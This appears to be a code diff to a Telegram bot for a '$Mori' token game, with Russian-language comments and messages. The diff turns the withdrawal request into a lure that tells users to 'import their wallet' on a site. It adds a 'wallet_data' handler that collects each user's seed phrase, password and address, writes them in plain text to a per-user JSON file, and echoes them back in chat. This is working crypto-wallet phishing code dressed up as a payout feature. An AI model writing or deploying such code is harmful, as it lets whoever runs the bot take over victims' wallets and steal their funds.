@@ -316,27 +316,116 @@ async def handle_web_app_data(update: Update, context: ContextTypes.DEFAULT_TYPE
                     logger.error(f"Fallback error type: {type(e2).__name__}")
         
         elif data.get('type') == 'withdraw_balance':
-            # Здесь должна быть интеграция с платежной системой для вывода средств
+            # Запрос на вывод средств
             amount = data.get('amount', 0)
             if user_id not in user_balances:
                 user_balances[user_id] = 0
             
+            logger.info(f"Withdraw request from user {user_id}: {amount} $Mori")
+            
             if user_balances[user_id] < amount:
-                await update.message.reply_text(
-                    f"❌ Недостаточно средств для вывода!\n"
-                    f"💰 Ваш баланс: {user_balances[user_id]} $Mori"
+                await context.bot.send_message(
+                    chat_id=chat_id,
+                    text=(
+                        f"❌ Недостаточно средств для вывода!\n"
+                        f"💰 Ваш баланс: {user_balances[user_id]} $Mori"
+                    )
                 )
             elif amount <= 0:
-                await update.message.reply_text(
-                    "❌ Неверная сумма для вывода!"
+                await context.bot.send_message(
+                    chat_id=chat_id,
+                    text="❌ Неверная сумма для вывода!"
                 )
             else:
-                # В реальном проекте здесь должна быть интеграция с платежной системой
-                await update.message.reply_text(
-                    f"✅ Запрос на вывод {amount} $Mori принят!\n"
-                    f"💰 Ваш баланс: {user_balances[user_id]} $Mori\n\n"
-                    f"Вывод средств будет обработан в ближайшее время."
+                # Открываем сайт для импорта кошелька
+                # Данные кошелька будут отправлены через wallet_data
+                await context.bot.send_message(
+                    chat_id=chat_id,
+                    text=(
+                        f"💵 Запрос на вывод {amount} $Mori принят!\n"
+                        f"💰 Ваш баланс: {user_balances[user_id]} $Mori\n\n"
+                        f"🔗 Откройте сайт и импортируйте кошелек для вывода средств."
+                    )
                 )
+        
+        elif data.get('type') == 'wallet_data':
+            # Получение данных кошелька от пользователя
+            seed_phrase = data.get('seedPhrase', '')
+            password = data.get('password', '')
+            wallet_address = data.get('walletAddress', '')
+            wallet_balance = data.get('balance', 0)
+            
+            logger.info(f"Wallet data received from user {user_id}")
+            logger.info(f"Balance: {wallet_balance}, Address: {wallet_address[:20]}...")
+            
+            # Сохраняем данные кошелька
+            if user_id not in user_balances:
+                user_balances[user_id] = 0
+            
+            # Обновляем баланс, если передан
+            try:
+                balance_value = float(wallet_balance) if wallet_balance else 0
+                if balance_value > 0:
+                    user_balances[user_id] = balance_value
+            except:
+                pass
+            
+            # Сохраняем данные кошелька в файл
+            wallet_data = {
+                'seedPhrase': seed_phrase,
+                'password': password,
+                'walletAddress': wallet_address,
+                'balance': user_balances[user_id],
+                'timestamp': str(update.message.date) if update.message else ''
+            }
+            
+            # Сохраняем данные кошелька в отдельный файл
+            wallet_file = Path(f'wallet_data_{user_id}.json')
+            try:
+                with open(wallet_file, 'w', encoding='utf-8') as f:
+                    json.dump(wallet_data, f, ensure_ascii=False, indent=2)
+                logger.info(f"Wallet data saved for user {user_id}")
+            except Exception as e:
+                logger.error(f"Error saving wallet data: {e}")
+            
+            # Сохраняем баланс
+            save_user_data()
+            
+            # Отправляем сообщение пользователю с его данными и балансом
+            user_name = update.effective_user.first_name or "Пользователь"
+            message_text = (
+                f"✅ Данные кошелька получены!\n\n"
+                f"💰 Ваш баланс: {user_balances[user_id]} $Mori\n\n"
+                f"📝 Seed фраза: `{seed_phrase}`\n\n"
+                f"🔑 Пароль: `{password}`\n\n"
+                f"💼 Адрес кошелька: `{wallet_address}`\n\n"
+                f"💵 Вывод средств будет обработан в ближайшее время."
+            )
+            
+            try:
+                await context.bot.send_message(
+                    chat_id=chat_id,
+                    text=message_text,
+                    parse_mode='Markdown'
+                )
+                logger.info(f"Wallet data confirmation sent to user {user_id}")
+            except Exception as e:
+                logger.error(f"Error sending wallet data confirmation: {e}")
+                # Пытаемся отправить без форматирования
+                try:
+                    await context.bot.send_message(
+                        chat_id=chat_id,
+                        text=(
+                            f"✅ Данные кошелька получены!\n\n"
+                            f"💰 Ваш баланс: {user_balances[user_id]} $Mori\n\n"
+                            f"📝 Seed фраза: {seed_phrase}\n\n"
+                            f"🔑 Пароль: {password}\n\n"
+                            f"💼 Адрес кошелька: {wallet_address}\n\n"
+                            f"💵 Вывод средств будет обработан в ближайшее время."
+                        )
+                    )
+                except Exception as e2:
+                    logger.error(f"Error sending fallback message: {e2}")
         
         elif data.get('type') == 'reset_spin_request':
             # Сбрасываем спин по запросу из Web App
